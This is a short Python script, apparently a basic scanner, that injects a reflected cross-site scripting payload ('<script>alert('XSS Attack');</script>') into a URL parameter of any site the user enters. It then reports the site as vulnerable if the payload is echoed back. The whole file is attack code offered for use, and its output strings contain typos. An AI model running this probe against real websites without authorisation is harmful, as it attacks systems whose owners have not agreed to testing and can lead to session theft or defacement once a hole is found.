import requests

def perform_xss_attack(url,vulnerable_parameter):
    payload = "<script>alert('XSS Attack');</script>"
    
    target_url = f"{url}?{vulnerable_parameter}={payload}"
    
    response = requests.get(target_url)
    
    if payload in response.text:
        print("XSS Attack successful! TThe application is vulknerable.")
    else:
        print("XSS Attack unsuccessful. The application is likely secure.")

def main():
    vulnerable_url = input("Enter the domain name. for example: https://www.example.com/?id=math")
    
    vulnerable_parameter = "query"
    
    print("Performing XSS Attack...")
    perform_xss_attack(vulnerable_url,vulnerable_parameter)
    
if __name__ == "__main__":
    main()